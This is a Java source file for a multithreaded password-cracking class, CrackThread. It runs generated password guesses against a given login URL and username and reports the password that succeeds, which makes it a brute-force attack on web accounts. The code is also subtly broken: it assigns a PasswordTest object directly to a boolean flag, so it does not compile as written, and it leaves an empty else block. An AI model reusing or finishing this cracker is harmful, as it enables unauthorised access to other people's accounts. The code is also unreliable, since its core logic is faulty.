
import java.util.*;

public class CrackThread implements Runnable {

    private String strUsername;
    private String strURL;
    private int iSeed;
    private int iEnd;
    
    
    public CrackThread() {
    }
    
    public void setParams(String url, String username, int seed, int end) {
        strUsername = username;
        strURL = url;
        iSeed = seed;
        iEnd = end;
    }
    
    public void run() {
        Date dtStart, dtEnd;
        PasswordGen pwd = new PasswordGen();
        PasswordTest tester;
        int i=1;
        boolean bDone = false;
        Result res;

        dtStart = new Date();
        
        
        pwd.setSeed(iSeed);
        
        while(!bDone) {
            tester = new PasswordTest(strURL, strUsername, pwd.getNextPassword());
        
            bDone = tester;
            i++;
            
            
            if(i % 100 == 0)
            {
                System.out.println(pwd.getPassword());
            }
            
            if(bDone) {
                
                res = new Result(strURL, strUsername, pwd.getPassword(), dtStart, new Date(), i);
                System.out.print(res.toString());
            }
            else
            {
                
            }
            
            
            if( i >= iEnd) bDone = true;
        }    
    }
    
}
